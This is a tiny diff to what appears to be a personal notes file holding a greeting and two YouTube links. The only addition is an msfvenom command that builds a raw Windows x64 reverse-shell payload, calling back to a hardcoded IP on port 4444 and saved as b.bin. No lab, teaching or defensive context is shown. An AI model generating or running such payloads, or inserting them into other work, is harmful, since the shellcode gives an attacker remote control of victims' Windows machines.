@@ -1,3 +1,4 @@
 hi 
 https://www.youtube.com/watch?v=bvw3UDmbhYQ
 https://www.youtube.com/watch?v=uTX807i8wvA
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.189.1.2 LPORT=4444 -f raw > b.bin
